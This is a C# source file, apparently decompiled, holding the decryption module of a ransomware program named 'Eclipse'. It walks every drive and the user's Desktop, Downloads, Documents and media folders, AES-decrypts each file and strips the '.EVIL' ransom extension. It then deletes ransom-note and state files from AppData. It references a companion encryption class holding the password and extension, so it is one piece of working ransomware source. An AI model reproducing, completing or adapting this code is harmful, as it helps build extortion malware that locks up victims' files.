using System;
using System.Diagnostics;
using System.IO;
using System.Security.Cryptography;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace Eclipse;

internal class decryption
{
	public class CoreDecryption
	{
		public static byte[] AES_Decrypt(byte[] bytesToBeDecrypted, byte[] passwordBytes)
		{
			byte[] result = null;
			byte[] salt = new byte[8] { 1, 2, 3, 4, 5, 6, 7, 8 };
			using (MemoryStream memoryStream = new MemoryStream())
			{
				using RijndaelManaged rijndaelManaged = new RijndaelManaged();
				rijndaelManaged.KeySize = 256;
				rijndaelManaged.BlockSize = 128;
				Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes(passwordBytes, salt, 1000);
				rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / 8);
				rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.BlockSize / 8);
				rijndaelManaged.Mode = CipherMode.CBC;
				using (CryptoStream cryptoStream = new CryptoStream(memoryStream, rijndaelManaged.CreateDecryptor(), CryptoStreamMode.Write))
				{
					cryptoStream.Write(bytesToBeDecrypted, 0, bytesToBeDecrypted.Length);
					cryptoStream.Close();
				}
				result = memoryStream.ToArray();
			}
			return result;
		}
	}

	public class DecryptionFile
	{
		public void DecryptFile(string fileEncrypted, string password)
		{
			byte[] bytesToBeDecrypted = File.ReadAllBytes(fileEncrypted);
			byte[] bytes = Encoding.UTF8.GetBytes(password);
			bytes = SHA256.Create().ComputeHash(bytes);
			byte[] bytes2 = CoreDecryption.AES_Decrypt(bytesToBeDecrypted, bytes);
			File.WriteAllBytes(fileEncrypted, bytes2);
		}
	}

	public static void decryptdrives()
	{
		DecryptionFile decryptionFile = new DecryptionFile();
		Console.WriteLine("Detecting drives....");
		DriveInfo[] drives = DriveInfo.GetDrives();
		foreach (DriveInfo driveInfo in drives)
		{
			if (!driveInfo.IsReady)
			{
				continue;
			}
			string[] files = Directory.GetFiles(driveInfo.Name, "*");
			Console.WriteLine("Detected " + driveInfo.Name);
			for (int j = 0; j < files.Length; j++)
			{
				try
				{
					decryptionFile.DecryptFile(files[j], encryption.password);
					File.Move(files[j], files[j].Replace(".EVIL", ""));
				}
				catch (Exception)
				{
				}
			}
		}
	}

	public static void decrypt()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.DesktopDirectory);
		string environmentVariable = Environment.GetEnvironmentVariable("USERPROFILE");
		string text = Path.Combine(environmentVariable, "Downloads");
		string text2 = Path.Combine(environmentVariable, "Videos");
		string text3 = Path.Combine(environmentVariable, "Music");
		string text4 = Path.Combine(environmentVariable, "Pictures");
		string text5 = Path.Combine(environmentVariable, "Documents");
		string[] files = Directory.GetFiles(folderPath + "\\", "*", SearchOption.AllDirectories);
		string[] files2 = Directory.GetFiles(text + "\\", "*", SearchOption.AllDirectories);
		string[] files3 = Directory.GetFiles(text2 + "\\", "*", SearchOption.AllDirectories);
		string[] files4 = Directory.GetFiles(text3 + "\\", "*", SearchOption.AllDirectories);
		string[] files5 = Directory.GetFiles(text4 + "\\", "*", SearchOption.AllDirectories);
		string[] files6 = Directory.GetFiles(text5 + "\\", "*", SearchOption.TopDirectoryOnly);
		DecryptionFile dec = new DecryptionFile();
		string password = encryption.password;
		Thread thread = new Thread((ThreadStart)delegate
		{
			//IL_02ec: Unknown result type (might be due to invalid IL or missing references)
			try
			{
				for (int i = 0; i < files.Length; i++)
				{
					try
					{
						dec.DecryptFile(files[i], password);
						File.Move(files[i], files[i].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				for (int j = 0; j < files2.Length; j++)
				{
					try
					{
						dec.DecryptFile(files2[j], password);
						File.Move(files2[j], files2[j].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				for (int k = 0; k < files3.Length; k++)
				{
					try
					{
						dec.DecryptFile(files3[k], password);
						File.Move(files3[k], files3[k].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				for (int l = 0; l < files4.Length; l++)
				{
					try
					{
						dec.DecryptFile(files4[l], password);
						File.Move(files4[l], files4[l].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				for (int m = 0; m < files5.Length; m++)
				{
					try
					{
						dec.DecryptFile(files5[m], password);
						File.Move(files5[m], files5[m].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				for (int n = 0; n < files6.Length; n++)
				{
					try
					{
						dec.DecryptFile(files6[n], password);
						File.Move(files6[n], files6[n].Replace(encryption.extension, ""));
					}
					catch (Exception)
					{
					}
				}
				DriveInfo[] drives = DriveInfo.GetDrives();
				foreach (DriveInfo driveInfo in drives)
				{
					string[] files7 = Directory.GetFiles(driveInfo.Name, "*", SearchOption.AllDirectories);
					for (int num2 = 0; num2 < files7.Length; num2++)
					{
						try
						{
							dec.DecryptFile(files7[num2], password);
							File.Move(files7[num2], files7[num2].Replace(encryption.extension, ""));
						}
						catch (Exception)
						{
						}
					}
				}
			}
			catch (Exception)
			{
			}
			decryptdrives();
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\userdata");
			File.Delete(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\death.txt");
			MessageBox.Show("Decrypted your files!");
			Process.GetCurrentProcess().Kill();
		});
		thread.Start();
	}
}
